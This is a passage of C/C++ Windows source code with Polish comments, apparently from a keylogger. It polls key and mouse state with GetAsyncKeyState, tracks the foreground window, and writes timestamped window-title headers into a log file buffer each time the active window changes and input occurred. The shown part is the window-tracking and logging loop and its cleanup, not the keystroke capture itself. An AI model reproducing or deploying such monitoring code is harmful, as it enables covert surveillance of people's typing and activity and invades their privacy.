    if  ((unsigned __int16)GetAsyncKeyState(VK_LBUTTON)!=0x8000 && (unsigned __int16)GetAsyncKeyState(0)!=0x8000 && HWNDIdPrv == (HWNDIdCrt=GetForegroundWindow()))
         continue;

    GetWindowText(HWNDIdCrt,HWNDlpTextCrt,255);

    if (strcmp(HWNDlpTextPrv,HWNDlpTextCrt)!=0)
       {
        HWNDIdPrv = HWNDIdCrt;
        //
        if (BuforPlikowy1->bufor.pos[PRV] < BuforPlikowy1->bufor.pos[CRT])
            BuforPlikowy1->bufor.pos[USR] = BuforPlikowy1->bufor.pos[CRT]; // jeœli coœ naciœniête to OK nowa nadpisywalna pozycja
       else BuforPlikowy1->bufor.pos[CRT] = BuforPlikowy1->bufor.pos[USR]; // jeœli nie to zmieñ pozycjê nadpisania na star¹
       ts::text::c_str::mov(HWNDlpTextPrv,HWNDlpTextCrt);
       GetTimeFormat(LOCALE_USER_DEFAULT,0,&SystemTime,"HH'.'mm'.'ss'::'",HWNDlpTextTmp,255);
       ts::text::c_str::add(HWNDlpTextTmp,HWNDlpTextCrt);
       ts::text::c_str::mov(HWNDlpTextLog,"\r\n\[");
       ts::text::c_str::add(HWNDlpTextLog,HWNDlpTextTmp);
       ts::text::c_str::add(HWNDlpTextLog,"]:");
       BuforPlikowy1->save(HWNDlpTextLog,CRT);
       BuforPlikowy1->bufor.pos[PRV] = BuforPlikowy1->bufor.pos[CRT]; // PRV = CRT i od tej pory jesli coœ bêdzie naciœniête => PRV < CRT
       }
}
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
BuforPlikowy1->save("\r\n}\0",CRT);
CloseHandle(hInstanceMutex);
ts::text::c_str::free(HWNDlpTextPrv);
ts::text::c_str::free(HWNDlpTextCrt);
ts::text::c_str::free(HWNDlpTextLog);
delete BuforPlikowy1;
return 0;
}
//---------------------------------------------------------------------------


